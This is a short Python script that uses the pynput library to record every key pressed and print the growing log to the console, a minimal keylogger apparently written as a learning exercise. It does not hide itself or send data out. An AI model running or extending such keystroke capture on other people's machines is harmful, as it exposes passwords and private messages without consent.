import pynput.keyboard

log = ""

def process_keys(key):
    global log
    try:
        log = log + key.char
    except AttributeError:
        log = log + str(key)
    
    print(log)

keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
with keyboard_listener:
    keyboard_listener.join()